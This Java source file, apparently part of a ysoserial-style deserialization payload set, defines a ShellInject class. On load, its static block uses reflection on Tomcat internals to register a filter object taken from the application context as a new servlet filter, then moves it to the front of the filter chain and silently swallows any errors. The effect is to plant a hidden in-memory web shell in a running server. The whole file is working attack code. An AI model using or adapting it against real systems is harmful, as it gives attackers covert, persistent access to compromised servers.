package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.Servlet;
import java.lang.reflect.Field;

public class ShellInject  {
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            Filter filter = (Filter) applicationContext.getAttribute("litchi");
            StandardContext standardContext = ((StandardContext)webappClassLoaderBase.getResources().getContext());
            String key = (String) filter.getClass().getField("key").get(filter);
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(key);
            filterDef.setFilterClass(filter.getClass().getName());
            filterDef.setFilter(filter);
            standardContext.addFilterDef(filterDef);
            standardContext.filterStart();
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(key);
            filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));
            filterMap.addURLPattern("/"+key);
            standardContext.addFilterMap(filterMap);
            Field filterMapsField = StandardContext.class.getDeclaredField("filterMaps");
            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
            filterMapsField.setAccessible(true);
            Field arrayField = filterMapsField.get(standardContext).getClass().getDeclaredField("array");
            arrayField.setAccessible(true);
            for (int i = 0; i < filterMaps.length; i++) {
                if (filterMaps[i].getFilterName().equalsIgnoreCase(key)) {
                    filterMaps[i] = filterMaps[0];
                    filterMaps[0] = filterMap;
                    break;
                }
            }
            arrayField.set(filterMapsField.get(standardContext),filterMaps);
        } catch (Exception e) {
        }
    }

}

